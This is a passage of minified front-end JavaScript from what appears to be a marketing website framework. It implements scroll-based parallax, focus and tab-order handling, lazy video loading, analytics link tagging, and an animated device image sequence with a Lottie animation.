Fk,this.watchKeyboardEvents(),Array.from(this.element.querySelectorAll(`[${this.selector}]`)).forEach((t=>{this.watchElement(t)}))}watchKeyboardEvents(){this.keyboardWatcher.on("mouse",(()=>{this.isUsingKeyboard=!1})),this.keyboardWatcher.on("keyboard",(()=>{this.isUsingKeyboard=!0}))}watchElement(t,e){_k(e)&&t.setAttribute(this.selector,e+""),this.config.setTabIndex&&(t.tabIndex=0),this.config.setAriaRole&&t.setAttribute("role",this.config.setAriaRole),this.watcher.add({element:t,on:"focus",callback:()=>{this.handleFocus(t)},eventOptions:{capture:!0}}),(this.config.mouseDown||this.debug)&&this.watcher.add({element:t,on:"mousedown",callback:()=>{this.handleFocus(t)}}),this.debug&&this.watcher.add({element:window,on:"scroll",callback:()=>{console.log("progress",Ok(this.element,this.topProgressOffset,this.bottomProgressOffset))}})}updateOffset(t,e){this.topProgressOffset=t,this.bottomProgressOffset=e}handleFocus(t){if(this.keyboardModeOnly&&!this.isUsingKeyboard)return;let e=t.getAttribute(this.selector);this.debug&&(console.log("el"+t),console.log("targetPercent"+e)),e&&this.scrollTo(+e)}scrollTo(t){let e=Rk(this.element,this.topProgressOffset,this.bottomProgressOffset,t);window.scrollTo(0,e)}dispose(){this.watcher&&this.watcher.dispose(),this.keyboardWatcher&&this.keyboardWatcher.dispose()}};function Nk(t,e){return e===Object.prototype.toString.call(t).slice(8,-1).toLowerCase()}function Vk(t){return Nk(t,"null")}function qk(){return Bk()||Wk()}function Bk(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||Uk()}function Wk(){return/Android/i.test(navigator.userAgent)}function Uk(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&Boolean(navigator.maxTouchPoints)&&navigator.maxTouchPoints>2}function Hk(t,e){let i=0,r=e=>{let r=window.innerWidth;(!qk()||i!==r)&&(t(e),i=r)};return window.addEventListener("resize",r,e),()=>{window.removeEventListener("resize",r)}}var Gk=class{constructor(){this.watcherConfigs=[]}add(t){Array.isArray(t.on)?t.on.forEach((e=>{let i=Object.assign({},t);i.on=e,this.addSingleEvent(i)})):this.addSingleEvent(t)}addSingleEvent(t){let e=e=>{t.runWhen?t.runWhen()&&t.callback(e):t.callback(e)};if(t.listener=e,"smartResize"===t.on)t.remover=Hk(e,t.eventOptions||{});else if("resize"===t.on&&t.element!==window){let i=new ResizeObserver((t=>{e(t)}));i.observe(t.element),t.remover=()=>{i.unobserve(t.element)}}else if("mutation"===t.on){let i=new MutationObserver((t=>{e(t)}));i.observe(t.element,t.eventOptions),t.remover=()=>{i.disconnect()}}else t.element,MediaQueryList,t.element.addEventListener(t.on,e,t.eventOptions||{}),t.remover=()=>{t.element.removeEventListener(t.on,e,t.eventOptions||{})};this.watcherConfigs.push(t)}removeById(t){this.watcherConfigs=this.watcherConfigs.filter((e=>{if(e.id&&e.id===t){let t=e.remover;return t&&t(),!1}return e}))}removeAll(){this.watcherConfigs.forEach((t=>{let e=t.remover;e&&e()})),this.watcherConfigs=[]}run(t){this.watcherConfigs.filter((e=>e.id&&e.id===t)).forEach((t=>{t.callback()&&t.callback()}))}dispose(){this.removeAll()}};function zk(t,e){return Object.is(t,void 0)?e:t}var Qn=class{constructor(t){this.config=t,this.debug=!1,this.element=t.element,this.watcher=new Gk,this.selector="data-scroll-to-center-of-screen-on-focus",this.debug=zk(t.debug,!1),Array.from(this.element.querySelectorAll(`[${this.selector}]`)).forEach((e=>{t.setTabIndex&&(e.tabIndex=0),t.setAriaRole&&e.setAttribute("role",t.setAriaRole),this.watcher.add({element:e,on:"focus",callback:()=>{this.handleFocus(e)},eventOptions:{capture:!0}}),(t.mouseDown||this.debug)&&this.watcher.add({element:e,on:"mousedown",callback:()=>{this.handleFocus(e)}})}))}handleFocus(t){let e=+t.getAttribute(this.selector),i=Vk(t.getAttribute("data-base-line"))?.5:+t.getAttribute("data-base-line");this.debug&&(console.log("el"+t),console.log("targetPercent"+e),console.log("targetBaseline"+i));let r=t.getBoundingClientRect(),n=r.top+i*r.height;n=window.scrollY+n;let s=n-e*window.innerHeight;window.scrollTo(0,s)}dispose(){this.watcher&&this.watcher.dispose()}},AS=class{constructor(t){this.range_=new Ae(+t.from,+t.to),this.class_=t.class,this.persistent_=!!t.persist}getCssClass(){return this.class_}contains(t){return this.range_.contains(t)}isPersistent(){return this.persistent_}},CS=class{constructor(t){this.rl_=de.getDestroyableInstance(),this.config=t,this.settings=kt.func.setDefault(t.settings,{}),this.progressEase=kt.func.setDefault(this.settings.progress_ease,.08),this.precision=kt.func.setDefault(this.settings.precision,5),this.debug=kt.func.setDefault(this.settings.debug,!1),this.addLerpDelta=kt.func.setDefault(this.settings.addLerpDelta,!1),this.addLerpDeltaAbs=kt.func.setDefault(this.settings.addLerpDeltaAbs,!1),this.allowOutOfRange=kt.func.setDefault(this.settings.allowOutOfRange,!1),this.renderOutview=kt.func.setDefault(this.settings.renderOutview,!1),this.element=t.element,this.direction=0,this.scrollToOnFocus=new an({element:this.element,debug:!1,setTabIndex:!0,setAriaRole:"region"}),this.scrollToCenterOfScreenOnFocus=new Qn({element:this.element,debug:!1,setTabIndex:!0,setAriaRole:"region"}),this.config.interpolations||(this.config.interpolations=[]);let e=this.config.class_triggers;this.cssClassTriggers=e?e.map((t=>new AS(t))):[],this.lastCssClassProgress=null,this.progress=0,this.easedProgress=0,this.rafProgress=new kt.RafProgress,this.rafProgress.setPrecision(this.precision),this.rafProgress.watch(kt.func.runOnceOnChange(this.progressLoop.bind(this))),this.config.interpolations=this.config.interpolations.map((t=>(t.progress=t.progress.map((t=>{if(t.ease)if(kt.is.array(t.ease))t.easingFunction=SS.CubicBezier.makeEasingFunction(t.ease[0],t.ease[1],t.ease[2],t.ease[3]);else{let e=kt.EASE[t.ease];e&&(t.easingFunction=e)}return t})),t))),this.interpolater=new wS.CssVarInterpolate(this.element,{interpolations:this.config.interpolations}),this.renderOutview&&(this.interpolater.renderOnlyWhenInview=!1)}setImmediateProgress(){this.interpolater.flush(),this.progress=this.getProgress(),this.rafProgress.easeTo(this.progress,1,kt.EASE.linear)}getProgress(){let t=0,e=0,i=t=>{let e=1;return"%"===t.unit&&(e=this.element.offsetHeight),"vh"===t.unit?(e=window.innerHeight,e*(t.value/100)):e*t.value};kt.is.string(this.settings.top)&&(t=i(_p.cssUnit.parse(this.settings.top)));let r=this.settings.top_relative_to||"";if("bottom"===r)t+=this.element.offsetHeight;else if(r.startsWith("[")&&r.endsWith("]")){let e=this.element.querySelector(r);e&&(t+=e.offsetTop)}kt.is.string(this.settings.bottom)&&(e=i(_p.cssUnit.parse(this.settings.bottom)));let n=this.settings.bottom_relative_to||"";if("top"===n)e-=this.element.offsetHeight;else if("top-position"===n)e+=t-this.element.offsetHeight;else if(n.startsWith("[")&&n.endsWith("]")){let t=this.element.querySelector(n);if(t){let i=zr(t,this.element);e-=this.element.offsetHeight,e+=i+t.offsetHeight}}return this.scrollToOnFocus.updateOffset(t,e),kt.dom.getElementScrolledPercent(this.element,t,e,this.allowOutOfRange)}onScroll(){this.rl_.measure((()=>{this.progress=this.getProgress(),this.rafProgress.easeTo(this.progress,this.progressEase,kt.EASE.linear,this.allowOutOfRange)}))}progressLoop(t,e){this.easedProgress=t,this.rl_.mutate((()=>this.interpolater.update(t))),this.direction=e;let i=null;(this.addLerpDelta||this.addLerpDeltaAbs)&&(i=this.rafProgress.getLerpDelta()),this.updateCssClassTriggers(),this.debug&&!yr.isProd()&&(console.log("-----------------------"),console.log("css-parallax scroll progress",t,window.scrollY),this.addLerpDelta&&console.log("css-parallax scroll delta",i),this.addLerpDeltaAbs&&console.log("css-parallax scroll delta",Math.abs(i))),this.rl_.mutate((()=>{this.addLerpDelta&&kt.dom.setCssVariable(this.element,"--lerp-delta",i),this.addLerpDeltaAbs&&kt.dom.setCssVariable(this.element,"--lerp-delta-abs",`${Math.abs(i)}`)}))}updateCssClassTriggers(){if(!this.cssClassTriggers)return;let t=kt.mathf.roundToPrecision(this.easedProgress,3);t<=.01&&(t=0),t>=.99&&(t=1);let e=this.config.elementVisibility.state().ready&&!this.config.elementVisibility.state().inview;if(t===this.lastCssClassProgress)return;this.lastCssClassProgress=t;let i=new Set(this.getAllCssTriggerClasses_()),r=new Set(this.cssClassTriggers.filter((t=>!e||t.isPersistent())).filter((e=>e.contains(t))).map((t=>t.getCssClass()))),n=Xn(i,r);this.rl_.mutate((()=>{hu(this.element,Array.from(r)),Xa(this.element,Array.from(n))}))}removeAllActiveCssTriggers(){this.rl_.mutate((()=>{Xa(this.element,this.getAllCssTriggerClasses_())}))}getAllCssTriggerClasses_(){return this.cssClassTriggers.map((t=>t.getCssClass()))}dispose(){this.scrollToOnFocus&&this.scrollToOnFocus.dispose(),this.scrollToCenterOfScreenOnFocus&&this.scrollToCenterOfScreenOnFocus.dispose(),this.rl_.destroy(),this.rafProgress.dispose()}},TS=class{static get $inject(){return["$rootScope","$attrs","$element","$scope","$window"]}constructor(t,e,i,r){this.element=i[0],this.configurations=JSON.parse(e.mqnCssParallax),this.throttle=+e.mqnCssParallaxThrottle||0,this.parallaxers=[],this.elementVisibility=bS.elementVisibility.inview(this.element,{rootMargin:"1000px 500px 1000px 500px"}),this.configurations.forEach((t=>{t.element=this.element,t.elementVisibility=this.elementVisibility,this.parallaxers.push(new CS(t))})),this.domWatcher=new ES.DomWatcher,this.domWatcher.add({element:window,on:"scroll",callback:kt.func.debounce((()=>{this.scrollAndInviewHandler()}),this.throttle),runWhen:()=>this.elementVisibility.state().inview,eventOptions:{passive:!0}}),window.setTimeout((()=>{this.parallaxers.forEach((t=>t.setImmediateProgress()))})),r.$on("$destroy",this.dispose.bind(this))}scrollAndInviewHandler(){this.parallaxers.forEach((t=>t.onScroll()))}dispose(){this.parallaxers.forEach((t=>t.dispose())),this.domWatcher.dispose(),this.elementVisibility.dispose()}},jk=()=>({restrict:"A",controller:TS}),xS=jk,IS=ye(Jt()),Eo=ye(gt()),Yk=function(){return{restrict:"A",link:function(t,e,i){if(Eo.is.ios())return;let r=e[0],n=IS.elementVisibility.inview(r,{rootMargin:"250px"},(()=>{n.state().ready&&(n.state().inview?Array.from(r.querySelectorAll("video source[data-video-src]")).map((t=>t.parentElement)).filter((t=>Ot(t,!0))).forEach((t=>Eo.dom.unflushVideos(t.parentElement))):Eo.dom.flushVideos(r,"mqn-lazyimage-src"))}));t.$on("$destroy",(()=>{n.dispose(),Eo.dom.flushVideos(r,"mqn-lazyimage-src")}))}}},PS=Yk,Xk=function(){return{restrict:"A",link:function(t,e,i){this.el=e[0],this.if=i.mqn2WombatDataAttrsIf,this.ifExp=i.mqn2WombatDataAttrsIfExp,this.value=i.mqn2WombatDataAttrsValue,this.data=i.mqn2WombatDataAttrsData,(this.if||this.ifExp&&t.$eval(this.ifExp))&&this.el.setAttribute(this.data,this.value)}}},OS=Xk;function RS(){return{restrict:"A",scope:{mqnElementDimensions:"="},link:function(t,e,i){let r=t.mqnElementDimensions||{},n=e[0],s=de.getDestroyableInstance(),o=Tt.getClosestMqnFrame(n),a=r.width,l=r.height,h=r["width-no-unit"],c=r["height-no-unit"],u=null,d=null,p=()=>{s.measure((()=>{s.cleanup((()=>p()));let t=n.offsetWidth,e=n.offsetHeight;t!==u&&(u=t,a&&s.mutate((()=>Ie(o,a,`${t}px`))),h&&s.mutate((()=>Ie(o,h,`${t}`)))),e!==d&&(d=e,l&&s.mutate((()=>Ie(o,l,`${e}px`))),c&&s.mutate((()=>Ie(o,c,`${e}`))))}))};p(),t.$on("$destroy",(()=>s.destroy()))}}}function MS(){return{restrict:"A",scope:{mqnWindowAspectRatio:"=",mqnWindowAspectRatioAdjustedForGdnHeader:"="},link:function(t,e,i){let r,n=t.mqnWindowAspectRatio||{},s=t.mqnWindowAspectRatioAdjustedForGdnHeader||{},o=e[0],a=de.getDestroyableInstance(),l=()=>{a.measure((()=>{let t=window.innerWidth,e=window.innerHeight,i=t/e,r=document.body.offsetWidth;a.mutate((()=>{Ie(o,"--window-width",`${t}`),Ie(o,"--window-height",`${e}`),Ie(o,"--window-ratio",`${i}`),Ie(o,"--body-width",`${r}`)})),Object.keys(n).forEach((t=>{let e=n[t],r=1*(i>e);a.mutate((()=>Ie(o,`--${t}`,`${r}`)))}));let l=cw();Object.keys(s).forEach((t=>{let e=s[t],i=1*(l>e);a.mutate((()=>Ie(o,`--${t}`,`${i}`)))}))}))},h=()=>{clearTimeout(r),r=setTimeout(l,100)};window.addEventListener("resize",h),l(),t.$on("$destroy",(()=>{window.removeEventListener("resize",h),a.destroy()}))}}}function Cn(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];var r=void 0,n=Number.POSITIVE_INFINITY,s=e[0];return t.forEach((function(t){var i=s(t);if(n>i)r=t,n=i;else if(n===i&&e.length>1){for(var o=1,a=e[o];o<e.length&&a(r)===a(t);)a=e[o++];a(r)>a(t)&&(r=t)}})),r}function So(t,e){return void 0===e&&(e=null),t&&t!==e?t.offsetTop+So(t.offsetParent,e):0}var du=function(){function t(){this.counter_=0}return t.prototype.next=function(t){return this.counter_++,{value:this.counter_,done:this.counter_>=Number.POSITIVE_INFINITY}},t.prototype[Symbol.iterator]=function(){return this},t}(),Qk=new du,Kk=["a","input","select","textarea","button","object","[tabindex]","[mqn-tabindex]"],$S=Kk.join(", ");function Zk(t){let e=t?`${$S}, ${t}`:$S;return Array.from(document.querySelectorAll(e)).filter((t=>!t.hasAttribute("disabled"))).filter((t=>!t.hasAttribute("tabindex")||-1!=+t.getAttribute("tabindex"))).filter((t=>t.offsetWidth>0)).filter((t=>t.offsetHeight>0)).filter((t=>Ot(t,!0)))}var LS=class{constructor(){this.rl_=de.getDestroyableInstance(),this.focusedElement_=null,this.focusInHandler_=()=>this.update_(),document.addEventListener("focusin",this.focusInHandler_)}getLastFocusedElement(){return this.focusedElement_}update_(){this.rl_.measure((()=>{this.focusedElement_=document.activeElement}))}dispose(){this.rl_.destroy(),document.removeEventListener("focusin",this.focusInHandler_)}},DS=class{constructor(t,e){this.group_=e,this.element_=t,this.uid_=Qk.next().value,this.order_=+t.getAttribute("mqn-tabindex"),this.keyDownHandler_=t=>this.handleKeydown_(t),this.element_.setAttribute("mqn-tabindex-uid",this.uid_),document.addEventListener("keydown",this.keyDownHandler_)}handleKeydown_(t){if(this.group_.getFocusService().getLastFocusedElement()===this.element_&&9===t.keyCode){let e=t.shiftKey?this.group_.getPrevious(this):this.group_.getNext(this);t.preventDefault(),e?e.focus():this.focusNonGroupItem_(t)}}focusNonGroupItem_(t){de.measure((()=>{let e=Zk(`[mqn-tabindex-uid="${this.uid_}"`),i=new Set(this.group_.getDisplayedItems().filter((t=>t!==this)).map((t=>t.getElement()))),r=e.filter((t=>!i.has(t))),n=t.shiftKey?-1:1,s=r.indexOf(this.element_),o=r[s+n];o&&o.focus()}))}focus(){this.element_.focus()}getElement(){return this.element_}getOrder(){return this.order_}dispose(){document.removeEventListener("keydown",this.keyDownHandler_)}},kS=class{constructor(t){this.element_=t,this.items_=new Set,this.rl_=de.getDestroyableInstance(),this.focusService_=new LS,this.itemElements_=new Set(Array.from(t.querySelectorAll("[mqn-tabindex]"))),this.items_=Array.from(this.itemElements_).map((t=>new DS(t,this))),this.focusInHandler_=t=>this.handleFocusIn_(t),this.init_()}init_(){this.element_.addEventListener("focusin",this.focusInHandler_)}getFocusService(){return this.focusService_}handleFocusIn_(t){let e=this.focusService_.getLastFocusedElement(),i=t.target;this.itemElements_.has(e)||!this.itemElements_.has(i)||this.rl_.measure((()=>{So(e)<So(i)?this.focusFirst():this.focusLast()}))}getDisplayedItems(){return Array.from(this.items_.values()).filter((t=>Ot(t.getElement(),!0))).filter((t=>"0"!==window.getComputedStyle(t.getElement()).opacity))}register(t){this.items_.add(t)}getLastItem(){return Ua(this.getDisplayedItems(),(t=>t.getOrder()))}isLast(t){return t===this.getLastItem()}focusFirst(){Cn(this.getDisplayedItems(),(t=>t.getOrder())).focus()}focusLast(){this.getLastItem().focus()}getNextItems_(t){return this.getDisplayedItems().filter((e=>e.getOrder()>t.getOrder()))}getNext(t){return Cn(this.getNextItems_(t),(t=>t.getOrder()))}getPreviousItems_(t){return this.getDisplayedItems().filter((e=>e.getOrder()<t.getOrder()))}getPrevious(t){return Ua(this.getPreviousItems_(t),(t=>t.getOrder()))}dispose(){this.rl_.destroy(),this.items_.forEach((t=>t.dispose())),this.focusService_.dispose()}};function bp(){return{restrict:"A",scope:{},link:(t,e,i)=>{let r=e[0],n=new kS(r);t.$on("$destroy",(()=>n.dispose()))}}}function wp(t){let e=Tt.getClosestMqnFrame(t);return e&&(e.getAttribute("mqn-tracking-id")||e.id)||""}function FS(){return{restrict:"A",scope:{},link:function(t,e,i){let r=e[0],n=wp(r),s=r.getAttribute("mqn-autotrack-gdn-links-selector")||"a",o=r.getAttribute("mqn-autotrack-gdn-links-event")||"module interaction",a=r.getAttribute("mqn-autotrack-gdn-links-category")||"module click",l=r.getAttribute("mqn-autotrack-gdn-links-action")||n,h=r.getAttribute("mqn-autotrack-gdn-links-label")||!1;Array.from(r.querySelectorAll(s)).forEach((t=>{let e=h||t.href||t.getAttribute("aria-label")||t.textContent;t.setAttribute("mqn-autotrack-event",o),t.setAttribute("mqn-autotrack-category",a),t.setAttribute("mqn-autotrack-action",l),t.setAttribute("mqn-autotrack-label",e)}))}}}var NS=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.$element=t,this.element=t[0],this.scrollToCenterOfScreenOnFocus=new Qn({element:this.element,debug:!1,setTabIndex:!0,setAriaRole:"region"}),e.$on("$destroy",(()=>{this.dispose_()}))}dispose_(){this.scrollToCenterOfScreenOnFocus&&this.scrollToCenterOfScreenOnFocus.dispose()}},Jk=function(){return{restrict:"A",controller:NS}},VS=Jk,Xt=ye(gt()),qS=ye(Nt()),Ep=ye(Ki()),Sp=ye(Gn()),BS=ye(Ba()),WS=ye(Fa()),eF="https://storage.googleapis.com/mannequin/2018/exports/2019-08-21/at-move/data.json",tF=Xt.is.ipad()?1:.08,Ap=class{static get $inject(){return["$rootScope","$element","$scope","$window"]}constructor(t,e,i,r){this.$window=r,this.$scope=i,this.$rootScope=t,this.$element=e,this.el=e[0],this.stickyParentElement=this.el.querySelector("[mqn-container]"),this.stickyChildElement=this.el.querySelector("[mqn-container-child]"),this.canvasContainerElement=this.el.querySelector("[canvas-container]"),this.loadingElement=this.el.querySelector("[loading]"),this.chapterContainerElement=this.el.querySelector("[chapters-container]"),this.groundElement=this.el.querySelector("[ground]"),this.chapterElements=Array.from(this.el.querySelectorAll("[chapter]")),this.subProgressCssInterpolater=new Ep.CssVarInterpolate(this.stickyParentElement),this.mainProgressCssInterpolater=new Ep.CssVarInterpolate(this.stickyParentElement),this.wombatImage=new wi(1),this.webpSupported=Xt.is.supportingWebp(),this.deviceSrcs=[],this.lottie=null,this.lottieFileLoaded=!1,this.domWatcher=new qS.DomWatcher,this.scrollToOnFocus=new an({element:this.stickyParentElement,mouseDown:!1,setTabIndex:!0}),i.$on("$destroy",(()=>this.dispose_()))}isJpgFallbackVersion(){return Xt.is.mobile()||Xt.is.safari()||this.isMobileViewport()}init(){this.deviceSrcs=JSON.parse(this.el.getAttribute("data-png-device")),this.deviceSrcs=this.deviceSrcs.map((t=>t=this.wombatImage.appendFifeParams(t,this.webpSupported))),this.deviceMobileSrcs=JSON.parse(this.el.getAttribute("data-jpg-device-mobile")),this.deviceSrcs=bi.addFifeUrlParamsToUrls(this.deviceSrcs),this.isJpgFallbackVersion()&&(this.deviceSrcs=JSON.parse(this.el.getAttribute("data-jpg-device")));let t=Xt.is.ipad()||yr.reduceSequenceCount()?4:2,e=this.deviceSrcs[this.deviceSrcs.length-1];this.deviceSrcs=this.deviceSrcs.filter(((e,i)=>i%t==0)),this.deviceSrcs[this.deviceSrcs.length-1]=e;let i=this.deviceMobileSrcs[this.deviceMobileSrcs.length-1];this.deviceMobileSrcs=this.deviceMobileSrcs.filter(((e,i)=>i%t==0)),this.deviceMobileSrcs[this.deviceMobileSrcs.length-1]=i,this.setupLottie(),this.sequenceCanvas=new BS.WebGlImageSequence(this.canvasContainerElement,[{images:this.deviceSrcs,when:()=>!this.isMobileViewport()},{images:this.deviceMobileSrcs,when:()=>this.isMobileViewport()}],null,Xt.is.ipad()?1:void 0),yr.evBypassEnabled()||yr.turnOffLazyImage()?this.startLoading():Xt.dom.runAfterWindowLoad((()=>{Xt.dom.runAfterNotTopOfScreen((()=>{this.startLoading()}))}))}setupLottie(){Xt.is.mobile()||Xt.is.safari()||fetch(eF).then((t=>t.json())).then((t=>{this.lottieFileLoaded=!0,this.lottie=WS.default.loadAnimation({container:this.el.querySelector("[lottie-container]"),renderer:"canvas",loop:!0,autoplay:!1,animationData:t,rendererSettings:{preserveAspectRatio:"xMidYMid slice"}})})).catch((t=>{console.error("Failed fetching lottie file",t),this.lottieFileLoaded=!1}))}startLoading(){this.sequenceCanvas.load().then((()=>{this.loadingElement.classList.add("loaded"),this.el.classList.add("loaded"),this.canvasContainerElement.classList.add("loaded"),this.onAssetLoaded_()}))}onAssetLoaded_(){this.rafProgress=new Xt.RafProgress((t=>{this.onEasedScroll(t)})),this.domWatcher.add({element:window,on:"smartResize",eventOptions:{passive:!0},callback:this.onResize.bind(this),id:"resize"}),this.domWatcher.add({element:window,on:"scroll",callback:this.onScroll.bind(this),eventOptions:{passive:!0},id:"scroll"}),this.domWatcher.run("resize"),this.domWatcher.run("scroll")}onScroll(){let t=Xt.dom.getElementScrolledPercent(this.stickyParentElement),e=this.stickyParentElement.offsetHeight,i=window.innerHeight/e;this.progress=Xt.mathf.childProgress(t,i,.9),this.rafProgress.easeTo(this.progress,tF,Xt.EASE.linear)}onEasedScroll(t){this.mainProgress=t;let e=Xt.mathf.childProgress(t,.1,1);if(this.isMobileViewport()){let t=Xt.mathf.lerp(.5,.8,e);this.sequenceCanvas.setSizingOptions({bottom:t,bottomNoClip:!0})}else{let t=Xt.mathf.lerp(0,.1,e);this.sequenceCanvas.setSizingOptions({bottom:t,bottomNoClip:!1})}if(this.sequenceCanvas.renderByProgress(e),!this.isJpgFallbackVersion()&&this.lottie&&this.lottie.totalFrames){let t=Xt.mathf.lerp(0,this.lottie.totalFrames,e)>>0;this.lottie.goToAndStop(t,!0)}this.subProgressCssInterpolater.update(e),this.mainProgressCssInterpolater.update(this.mainProgress)}onResize(){this.subProgressCssInterpolater.flush(),this.mainProgressCssInterpolater.flush(),this.calculateCssInterpolation(),this.domWatcher.run("scroll")}calculateCssInterpolation(){this.chapterContainerElement.style.top="";let t=window.innerHeight/2;this.groundElement.style.top=t+"px";let e=.4*this.canvasContainerElement.offsetHeight,i=.3*this.canvasContainerElement.offsetHeight,r=0;if(!this.isMobileViewport()){let t=this.sequenceCanvas.getImageSize(),e=Xt.mathf.calculateBackgroundContain({width:window.innerWidth,height:window.innerHeight},t),i={width:t.width*e,height:t.height*e};r=i.height-window.innerHeight/2-i.height/2}this.mainProgressCssInterpolater.setInterpolations({interpolations:[{id:"--chapter-1-opacity",progress:[{from:0,to:.1,start:1,end:0}]}]}),this.subProgressCssInterpolater.setInterpolations({interpolations:[{id:"--canvas-y",progress:[{from:0,to:.3,start:r+"px",end:r+"px"}]},{id:"--ground-y",progress:[{from:0,to:.3,start:"0px",end:e+"px",easingFunction:Sp.CubicBezier.makeEasingFunction(.2,.17,.83,.67)}]},{id:"--ground-y-mobile",progress:[{from:0,to:.3,start:"0px",end:i+"px",easingFunction:Sp.CubicBezier.makeEasingFunction(.2,.17,.83,.67)}]},{id:"--ground-opacity",progress:[{from:.2,to:.3,start:1,end:0}]},{id:"--chapter-2-opacity",progress:[{from:.25,to:.3,start:0,end:1},{from:.5,to:.55,start:1,end:0}]},{id:"--chapter-3-opacity",progress:[{from:.55,to:.6,start:0,end:1},{from:.9,to:.95,start:1,end:0}]},{id:"--chapter-4-opacity",progress:[{from:.95,to:1,start:0,end:1}]}]})}isMobileViewport(){return window.innerWidth<768}dispose_(){this.elementVisibility&&this.elementVisibility.dispose(),this.sequenceCanvas&&this.sequenceCanvas.dispose(),this.domWatcher&&this.domWatcher.dispose(),this.scrollToOnFocus&&this.scrollToOnFocus.dispose()}},US=Ap,Cp=class{static get $inject(){return["$element","$scope","$http"]}constructor(t,e,i){this.el=t[0],this.url=this.el.getAttribute("data-url"),this.$scope=e,this.$http=i,this.categories=[],this.categoryIdsToApps={},this.categoryIdsToLimits={}}init(t){this.categories=t;let e=Math.floor(new Date/1e3);this.$http.get(`${this.url}?c=${e}`).then((t=>{t.data.forEach((t=>{this.categoryIdsToApps[t.category]||(this.categoryIdsToApps[t.category]=[]),this.categoryIdsToApps[t.category].push(t)})),this.categories.forEach((t=>{t.apps=this.categoryIdsToApps[t.id]}))}))}getFilteredApps(t,e){return e.slice(0,this.categoryIdsToLimits[t]||6)}showMoreForCategory(t){this.categoryIdsToLimits[t]=(this.categoryIdsToLimits[t]||0)+36}hasMoreToShow(t,e){return this.getFilteredApps(t,e).length<e.length}},HS=Cp,Tp={COLOR_CHANGE:650,IMAGE_CHANGE:2150,MOBILE_AUTO_INTERVAL:4e3},GS={ACTIVE_SLIDE:te.mqnCssName("mqn2-picker__slide--active"),ACTIVE_DOT:te.mqnCssName("mqn2-dots__item--outline")},xp=class{constructor(t=null){this.maxLength_=t,this.next_=null}add(t){this.next_=null!==this.maxLength_?(t+this.maxLength_)%this.maxLength_:t}pop(){let t=this.next_;return this.next_=null,t}},zS=class{static get $inject(){return["$element","$scope","$timeout"]}constructor(t,e,i){this.element=t[0],this.ngScope_=e,this.ngTimeout_=i,this.destroyed_=!1,this.activeColor=0,this.previousColor=-1,this.activeSlide=0,this.previousSlide=-1,this.colorTransitionTimeout_=null,this.slideTransitionTimeout_=null,this.mobileSlideTransitionTimeout_=null;let r=parseInt(this.element.getAttribute("data-num-colors")),n=parseInt(this.element.getAttribute("data-num-slides"));this.colorQueue_=new xp(r),this.slideQueue_=new xp(n),this.startMobileTimeout_(),this.resizeHandler_=()=>this.startMobileTimeout_(),window.addEventListener("resize",this.resizeHandler_),e.$on("$destroy",(()=>this.dispose()))}transitionColor(){if(null!==this.colorTransitionTimeout_)return;let t=this.colorQueue_.pop();null!==t&&(this.previousColor=this.activeColor,this.activeColor=t,this.colorTransitionTimeout_=this.ngTimeout_((()=>{this.colorTransitionTimeout_=null,this.previousColor=-1;let t=this.element.querySelector(`.${GS.ACTIVE_SLIDE} .${GS.ACTIVE_DOT}`);t&&t.focus()}),Tp.COLOR_CHANGE))}transitionSlide(){if(null!==this.slideTransitionTimeout_)return;let t=this.slideQueue_.pop();null!==t&&(this.previousSlide=this.activeSlide,this.activeSlide=null,this.ngTimeout_((()=>this.activeSlide=t),0),this.ngTimeout_.cancel(this.mobileSlideTransitionTimeout_),this.slideTransitionTimeout_=this.ngTimeout_((()=>{this.slideTransitionTimeout_=null,this.transitionSlide(),this.startMobileTimeout_()}),Tp.IMAGE_CHANGE))}startMobileTimeout_(){this.ngTimeout_.cancel(this.mobileSlideTransitionTimeout_),this.mobileSlideTransitionTimeout_=this.ngTimeout_((()=>this.transitionIfMobile_()),Tp.MOBILE_AUTO_INTERVAL)}transitionIfMobile_(){this.ngTimeout_.cancel(this.mobileSlideTransitionTimeout_),rt.isMobile()&&this.next()}setColor(t){this.colorQueue_.add(t),this.transitionColor()}setSlide(t){this.slideQueue_.add(t),this.transitionSlide()}next(){this.setSlide(this.activeSlide+1)}previous(){this.setSlide(this.activeSlide-1)}dispose(){window.removeEventListener("resize",this.resizeHandler_),this.ngTimeout_.cancel(this.colorTransitionTimeout_),this.ngTimeout_.cancel(this.slideTransitionTimeout_),this.ngTimeout_.cancel(this.mobileSlideTransitionTimeout_)}},jS=zS,Pp=ye(en()),Op=ye(gt());function rF(...t){}var iF=class extends Map{constructor(t=[],e=rF){super(t),this.defaultFunction=e}static usingFunction(t){return new this([],t)}get(t){if(this.has(t))return super.get(t);{let e=this.defaultFunction(t);return this.set(t,e),e}}},nF=class{constructor(){this.callbacks=iF.usingFunction((()=>new Set))}on(t,e){this.callbacks.get(t).add(e)}dispatch(t,...e){this.callbacks.get(t).forEach((t=>t(...e)))}off(t,e){let i=this.callbacks.get(t);i.delete(e),0===i.size&&this.callbacks.delete(t)}dispose(){let t=this.callbacks.values(),e=t.next();for(;!e.done;)e.value.clear(),e=t.next();this.callbacks.clear()}},Ip=(t=>(t.ANY_CHANGE="any",t.MOUSE="mouse",t.KEYBOARD="keyboard",t))(Ip||{}),YS=class{constructor(){this.state=null,this.eventManager=new nF,this.listenerDisposers=[],this.addEvents("mousemove",this.setMouse.bind(this)),this.addEvents("mousedown",this.setMouse.bind(this)),this.addEvents("mouseup",this.setMouse.bind(this)),this.addEvents("touchmove",this.setMouse.bind(this)),this.addEvents("touchstart",this.setMouse.bind(this)),this.addEvents("touchend",this.setMouse.bind(this)),this.addEvents("keyup",this.setKeyboard.bind(this)),this.addEvents("keydown",this.setKeyboard.bind(this))}on(t,e){this.eventManager.on(t,e)}off(t,e){this.eventManager.on(t,e)}setKeyboard(){"keyboard"!==this.state&&(this.state="keyboard",this.eventManager.dispatch("keyboard"),this.eventManager.dispatch("any"))}setMouse(){"mouse"!==this.state&&(this.state="mouse",this.eventManager.dispatch("mouse"),this.eventManager.dispatch("any"))}addEvents(t,e){document.addEventListener(t,e),this.listenerDisposers.push((()=>{document.removeEventListener(t,e)}))}dispose(){this.eventManager.dispose(),this.listenerDisposers.forEach((t=>{t()}))}},XS=class{static get 